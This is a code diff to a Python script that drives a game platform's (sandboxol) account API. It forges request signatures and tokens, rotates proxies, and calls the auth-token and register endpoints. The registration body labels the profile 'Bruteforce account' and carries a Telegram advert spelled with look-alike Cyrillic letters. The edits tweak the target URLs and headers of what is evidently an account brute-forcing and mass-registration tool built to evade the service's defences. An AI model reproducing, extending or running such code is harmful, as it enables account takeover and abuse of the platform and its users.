@@ -1,4 +1,4 @@
-jimport asyncio
+import asyncio
 import base64
 import hashlib
 import random
@@ -161,7 +161,7 @@ async def cr(session, lock):
         xsign = get_xsign("/user/api/v5/account/auth-token", nonce, xtime, f"q={query}", android_id)
         try:
             async with session.get(
-                f"https://{random.choice(DATA_CENTERS)}/user/api/v5/account/auth-token",
+                f"http://gw.sandboxol.com/user/api/v5/account/auth-token",
                 timeout=2,
                 params={"q":query},
                 proxy=random.choice(PROXY_WORK),
@@ -217,7 +217,6 @@ async def cr(session, lock):
                     "X-Sign": xsign,
                     "X-UrlPath": "/user/api/v5/account/auth-token",
                     "Access-Token": "",
-                    "Host": "gw.sandboxol.com",
                     "Connection": "Keep-Alive",
                     "Accept-Encoding": "gzip",
                     "User-Agent": "okhttp/4.10.0"
@@ -238,7 +237,7 @@ async def cr(session, lock):
                     body_string = f'{{"decorationPicUrl":"http://static.sandboxol.com/sandbox/avatar/male.png","inviteCode":"","details":"httрs://t.mе/kn_ew (in telegram @kn_ew)\\nBruteforce account","decorationPicUrl":"http://staticgs.sandboxol.com/avatar/1761081787482114.jpg","nickName":"{nickname}","picType":1,"sex":1}}'
                     xsign = get_xsign(f"/user/api/v1/user/register", nonce, xtime, body_string, android_id)
                     async with session.post(
-                        f"https://{random.choice(DATA_CENTERS)}/user/api/v1/user/register",
+                        f"http://gw.sandboxol.com/user/api/v1/user/register",
                         timeout=2,
                         data=body_string.encode(),
                         proxy=random.choice(PROXY_WORK),
@@ -291,7 +290,6 @@ async def cr(session, lock):
                             "X-UrlPath": "/user/api/v1/user/register",
                             "Access-Token": get_enc_token(token + nonce),
                             "Content-Type": "application/json; charset=UTF-8",
-                            "Host": "gw.sandboxol.com",
                             "Connection": "Keep-Alive",
                             "Accept-Encoding": "gzip",
                             "User-Agent": "okhttp/4.10.0"
